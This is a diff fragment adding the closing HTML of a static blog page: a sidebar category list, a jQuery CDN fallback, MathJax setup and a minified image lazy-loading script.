+        <span class="sidebar-category-name" data-categories="验证码"><span class="iconfont-archer">&#xe60a;</span>验证码</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Sariel.D"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var i=n.imageLazyLoadSetting.isSPA,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){i&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,e,a=0;a<r.length;a++)t=r[a],e=void 0,0<=(e=t.getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(n.innerHeight||document.documentElement.clientHeight)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},n.src=i}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+</html>
+
+
